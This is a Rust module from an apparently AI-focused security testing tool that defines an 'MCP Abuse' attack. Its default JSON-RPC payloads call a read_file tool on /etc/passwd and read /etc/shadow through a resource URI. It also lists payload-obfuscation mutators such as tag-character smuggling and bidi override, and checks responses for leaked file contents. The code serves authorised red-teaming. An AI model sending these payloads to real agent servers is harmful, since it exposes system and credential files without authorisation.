use async_trait::async_trait;

use crate::attacks::common::{extract_response_text, json_pointer_exists, matching_indicators};
use crate::category::AttackCategory;
use crate::error::AttackResult;
use crate::payload::MutatorKind;
use crate::traits::Attack;
use crate::types::{
    AttackContext, AttackEvaluation, AttackPayload, AttackPlan, AttackResponse, FindingSeverity,
};

pub struct McpAbuseAttack;

#[async_trait]
impl Attack for McpAbuseAttack {
    fn id(&self) -> &'static str {
        "mcp_abuse"
    }

    fn category(&self) -> AttackCategory {
        AttackCategory::McpAbuse
    }

    fn name(&self) -> &'static str {
        "MCP Abuse"
    }

    fn description(&self) -> &'static str {
        "Attempts MCP tool schema abuse, resource poisoning, and cross-server pivot"
    }

    async fn plan(&self, _ctx: &AttackContext) -> AttackResult<AttackPlan> {
        Ok(AttackPlan {
            attack_id: self.id().into(),
            category: self.category(),
            mutators: vec![
                MutatorKind::JsonEscape,
                MutatorKind::HtmlWrap,
                MutatorKind::Base64Wrap,
                MutatorKind::DelimiterInjection,
                MutatorKind::TokenSplit,
                MutatorKind::MarkdownCodeFence,
                MutatorKind::UrlWrap,
                MutatorKind::TagCharSmuggle,
                MutatorKind::BidiOverride,
            ],
            payload_ids: vec![],
            notes: Some("Targets MCP JSON-RPC tool/resource endpoints".into()),
        })
    }

    fn default_payloads(&self) -> Vec<AttackPayload> {
        vec![
            AttackPayload::new(
                "mcp-tool-call",
                "Unauthorized MCP tool call",
                AttackCategory::McpAbuse,
                r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/etc/passwd"}}}"#,
            ),
            AttackPayload::new(
                "mcp-resource-poison",
                "Resource URI injection",
                AttackCategory::McpAbuse,
                r#"{"jsonrpc":"2.0","id":2,"method":"resources/read","params":{"uri":"file:///etc/shadow"}}"#,
            ),
            AttackPayload::new(
                "mcp-list-tools",
                "Tool enumeration",
                AttackCategory::McpAbuse,
                r#"{"jsonrpc":"2.0","id":3,"method":"tools/list","params":{}}"#,
            ),
        ]
    }

    async fn evaluate(
        &self,
        _ctx: &AttackContext,
        _payload: &AttackPayload,
        response: &AttackResponse,
    ) -> AttackResult<AttackEvaluation> {
        let text = extract_response_text(&response.body);
        let indicators = matching_indicators(
            &text,
            &[
                ("mcp_tools", r#"tools/list|tools/call|"tools""#),
                ("mcp_resources", r#"resources/read|"uri""#),
                ("file_read", r"root:|/etc/(passwd|shadow)"),
                ("jsonrpc", r#""jsonrpc"\s*:\s*"2\.0""#),
            ],
        );

        let result_field = json_pointer_exists(&response.body, "/result");

        if indicators.is_empty() && !result_field {
            return Ok(AttackEvaluation::negative("No MCP abuse indicators"));
        }

        Ok(AttackEvaluation::positive(
            FindingSeverity::Critical,
            0.80,
            "MCP server may expose tools or resources without authorization",
            indicators,
        ))
    }
}
